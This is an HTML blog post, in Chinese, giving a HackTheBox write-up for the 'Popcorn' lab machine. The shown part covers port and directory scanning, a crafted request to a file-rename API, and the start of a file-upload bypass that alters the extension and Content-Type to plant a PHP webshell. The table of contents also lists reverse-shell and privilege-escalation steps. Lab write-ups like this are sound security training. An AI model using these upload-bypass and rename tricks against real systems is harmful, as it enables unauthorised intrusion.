@@ -1,0 +1,504 @@
+<!DOCTYPE html>
+<html lang='en'>
+
+<head>
+  <meta name="generator" content="Hexo 5.4.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  <title>HTB: Popcorn - T0x1c</title>
+
+  
+    <meta name="description" content="Popcorn是一个中等难度的靶机，知识点涉及文件上传绕过、MODT提权、脏牛提权等。感兴趣的同学可以在HackTheBox中进行学习。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB: Popcorn">
+<meta property="og:url" content="https://toxic80l.github.io/post/a345616c/index.html">
+<meta property="og:site_name" content="T0x1c">
+<meta property="og:description" content="Popcorn是一个中等难度的靶机，知识点涉及文件上传绕过、MODT提权、脏牛提权等。感兴趣的同学可以在HackTheBox中进行学习。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-06%2010.37.29.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0410.gif">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/Popcorn.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-06%2012.46.55.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-06%2016.54.20.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-06%2017.31.35.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-06%2017.33.16.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-06%2017.59.32.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-06%2023.33.41.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-06%2023.43.50.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-06%2023.48.28.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-06%2023.51.20.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-06%2023.51.52.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-06%2023.56.32.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-06%2023.58.55.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2000.02.41.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2001.09.50.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2001.18.24.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2001.20.34.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2001.25.15.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2001.26.47.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2001.30.11.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2009.52.36.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2009.46.15.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2009.50.15.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2009.44.53.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2010.04.36.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2010.09.02.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2010.14.21.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2010.16.41.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2010.21.58.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2010.23.14.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2010.57.17.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2011.08.09.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2011.12.19.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2011.12.26.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2011.23.37.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2011.27.13.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2011.31.23.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2011.33.48.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2011.36.32.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2013.08.58.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2013.09.19.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2016.05.14.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2016.22.52.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2016.27.37.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2016.29.54.png">
+<meta property="article:published_time" content="2022-05-28T11:19:54.000Z">
+<meta property="article:modified_time" content="2022-06-06T02:16:12.682Z">
+<meta property="article:author" content="toxic80L">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="靶机">
+<meta property="article:tag" content="文件上传">
+<meta property="article:tag" content="MODT">
+<meta property="article:tag" content="脏牛、">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://toxic80l.github.io/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-06%2010.37.29.png">
+  
+  
+
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+
+  
+</head>
+
+<body>
+  
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+
+<header class="header">
+
+<div class="logo-wrap"><a class="avatar" href="/medias/avatar.png"><div class="bg" style="opacity:0;background-image:url(https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.2/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></a><a class="title" href="/"><div class="main">T0x1c</div><div class="sub cap">我在听你的独家记忆</div></a></div>
+<nav class="menu dis-select"><a class="nav-item active" href="/">Blog</a><a class="nav-item" href="/wiki/">Wiki</a><a class="nav-item" href="/notes/">notes</a><a class="nav-item" href="/friends/">more</a></nav></header>
+
+<div class="widgets">
+
+<div class="widget-wrap single" id="toc"><div class="widget-header cap dis-select"><span class="name">TOC</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E4%BE%A6%E6%9F%A5"><span class="toc-text">0x01 侦查</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-text">端口探测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#80%E7%AB%AF%E5%8F%A3"><span class="toc-text">80端口</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E4%B8%8A%E7%BA%BF-www-data"><span class="toc-text">0x02 上线[www-data]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87"><span class="toc-text">文件上传绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">反弹shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-root"><span class="toc-text">0x03 权限提升[root]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MODT%E6%8F%90%E6%9D%83"><span class="toc-text">MODT提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SSH%E7%99%BB%E5%BD%95"><span class="toc-text">SSH登录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7"><span class="toc-text">添加用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90"><span class="toc-text">脚本分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83"><span class="toc-text">脏牛提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E6%80%BB%E7%BB%93"><span class="toc-text">0x04 总结</span></a></li></ol></div></div></div>
+
+
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/toxic80L" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.3/social/08a41b181ce68.svg"/></a></div></footer>
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">Home</a><span class="sep"></span><a class="cap breadcrumb" href="/">Blog</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/HackTheBox/">HackTheBox</a></div><div id="post-meta">Posted on&nbsp;<time datetime="2022-05-28T11:19:54.000Z">2022-05-28</time></div></div>
+
+<article class='content md post'>
+<h1 class="article-title"><span>HTB: Popcorn</span></h1>
+<p>Popcorn是一个中等难度的靶机，知识点涉及文件上传绕过、MODT提权、脏牛提权等。感兴趣的同学可以在HackTheBox中进行学习。</p>
+<span id="more"></span>
+
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-06%2010.37.29.png" alt="截屏2022-05-06 10.37.29"></p>
+<span class="tag-plugin emoji"><img no-lazy class="inline" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0410.gif" style="height:3em" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></span><u>通关思维导图</u>
+
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/Popcorn.png" alt="Json"></p>
+<h2 id="0x01-侦查"><a href="#0x01-侦查" class="headerlink" title="0x01 侦查"></a>0x01 侦查</h2><h3 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h3><p>首先通过nmap对目标进行端口扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -p- -sV -sC -A 10.10.10.6 -oA nmap_Popcorn</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-06%2012.46.55.png" alt="截屏2022-05-06 12.46.55"><br>扫描结果显示目标开放了22、80端口</p>
+<h4 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h4><p>访问后发现是一个 Apache 默认界面<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-06%2016.54.20.png" alt="截屏2022-05-06 16.54.20"></p>
+<p>使用 gobuster 扫描目录在，在其中发现目录<code>/test</code>、<code>/torrent</code>、<code>/rename</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://10.10.10.6 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-06%2017.31.35.png" alt="截屏2022-05-06 17.31.35"><br><strong>test</strong></p>
+<p>访问目录<code>/test</code>是<code>phpinfo</code>界面。其中包含许多信息，值得注意的是<code>file_uploads=open</code>，如果存在文件包含可执行代码<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-06%2017.33.16.png" alt="截屏2022-05-06 17.33.16"><br><strong>rename</strong></p>
+<p>访问目录<code>/rename</code>，发现这是一个用于重命名的 API 端点<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-06%2017.59.32.png" alt="截屏2022-05-06 17.59.32"></p>
+<p>尝试构造 payload 将<code>index.html</code>重命名为<code>mac.html</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.6/rename/index.php?filename=index.html&amp;newfilename=mac.html</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-06%2023.33.41.png" alt="截屏2022-05-06 23.33.41"></p>
+<p>但并没有成功重命名，与此同时它还暴露了绝对路径。那么我们可以有这样一个思路：找到一个文件上传点上传带有 php 代码的图片，通过这个 API 修改后缀名为 php，是否可以完成利用呢？</p>
+<p><strong>torrent</strong></p>
+<p>访问目录<code>/torrent</code>，其提供 Torrent Hoster 的实例<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-06%2023.43.50.png" alt="截屏2022-05-06 23.43.50"></p>
+<p>但访问<code>Upload</code>会重定向到登录界面；访问<code>Browse</code>出现一个名为 Kali Linux 的<code>torrent</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-06%2023.48.28.png" alt="截屏2022-05-06 23.48.28"></p>
+<p>尝试注册用户<code>mac/mac</code>并输入邮箱<code>mac@mac.com</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-06%2023.51.20.png" alt="截屏2022-05-06 23.51.20"></p>
+<p>注册成功并返回用户信息<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-06%2023.51.52.png" alt="截屏2022-05-06 23.51.52"></p>
+<p>使用刚注册的账户<code>mac/mac</code>登录成功<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-06%2023.56.32.png" alt="截屏2022-05-06 23.56.32"></p>
+<p>进入<code>Upload</code>功能点发现我们能够上传<code>Torrent</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-06%2023.58.55.png" alt="截屏2022-05-06 23.58.55"></p>
+<p>尝试上传 webshell，但结果上传失败。<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2000.02.41.png" alt="截屏2022-05-07 00.02.41"></p>
+<p>那么尝试上传一个有效的<code>Torrent</code>种子文件呢？<br><strong>Kali种子地址：<a target="_blank" rel="noopener" href="https://kali.download/base-images/kali-2022.1/kali-linux-2022.1-installer-amd64.iso.torrent">https://kali.download/base-images/kali-2022.1/kali-linux-2022.1-installer-amd64.iso.torrent</a></strong><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2001.09.50.png" alt="截屏2022-05-07 01.09.50"></p>
+<p>提交上传后等一分钟可重定向至<code>Torrent</code>界面<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2001.18.24.png" alt="截屏2022-05-07 01.18.24"></p>
+<p>点击<code>Edit this torrent</code>后会跳出新表单如下：<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2001.20.34.png" alt="截屏2022-05-07 01.20.34"></p>
+<p>在其中上传与该种子相关的图片，结果显示上传完成<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2001.25.15.png" alt="截屏2022-05-07 01.25.15"></p>
+<p>查看图片地址为<code>/thumbnail.php?gd=2&amp;src=./upload/708759a17400cb3d4368e4769048f3d61e5466e3.png&amp;maxw=96</code>，可能存在文件包含漏洞<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2001.26.47.png" alt="截屏2022-05-07 01.26.47"></p>
+<p>与此同时<code>src</code>还指向了一个路径<code>http://10.10.10.6/torrent/upload/</code>，访问后目标返回一个目录列表，通过目录遍历发现上传的所有图片文件<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2001.30.11.png" alt="截屏2022-05-07 01.30.11"></p>
+<h2 id="0x02-上线-www-data"><a href="#0x02-上线-www-data" class="headerlink" title="0x02 上线[www-data]"></a>0x02 上线[www-data]</h2><h3 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h3><p>综上我们可以发现两个文件上传点，分别为 torrent 以及 torrent 对应图片。显然我们对图片上传点更感兴趣，但直接上传 webshell 目标会返回<code>invalid file</code>，尝试使用一些常见的绕过方法进行测试</p>
+<blockquote>
+<ul>
+<li>修改文件扩展名</li>
+<li>修改 Content-Type</li>
+<li>修改文件上传内容</li>
+</ul>
+</blockquote>
+<p>上传图片使用 BurpSuite 截取数据包并发送至 Repeater 进行测试<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2009.52.36.png" alt="截屏2022-05-07 09.52.36"></p>
+<p>尝试直接修改文件扩展名为<code>.php</code>、<code>Content-Type</code>为<code>application/x-php</code>，点击发送后无法上传<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/a345616c/%E6%88%AA%E5%B1%8F2022-05-07%2009.46.15.png" alt="截屏2022-05-07 09.46.15"></p>
